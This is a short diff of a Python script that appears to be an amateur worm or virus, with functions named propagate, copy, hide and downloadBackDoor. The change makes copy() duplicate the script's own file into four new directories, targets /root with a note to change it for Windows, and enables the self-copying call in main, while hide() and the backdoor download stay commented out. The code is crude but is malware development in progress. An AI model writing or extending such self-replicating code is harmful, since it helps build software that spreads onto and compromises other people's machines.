@@ -54,14 +54,17 @@ def propagate():
 	print("src:", src)
 
 def copy():
-	script = argv
+	script = sys.argv
 	name = str(script[0])
-	b = os.path.getsize(os.path.abspath("C:"))
+	b = os.path.getsize(os.path.abspath("/root")) #Change in windows
 	for i in range(0, 4):
-		directoryName = "copy"+str(i)
-		os.mkdir(directoryName)
-		shutil.copy(name, directoryName)
-		src = os.path.abspath(directoryName)
+		directoryName = "files_" + str(i)
+		try:
+			os.makedirs(directoryName, 0755)
+			shutil.copy(name, directoryName)
+			src = os.path.abspath(directoryName)
+		except OSError as e:
+			os.chmod(directoryName, 0755)
 
 """
 def hide():
@@ -92,7 +95,7 @@ def run(program):
 	process.wait()
 
 def main():
-	#copy()
+	copy()
 	#hide()
 	propagate()
 	#downloadBackDoor("")
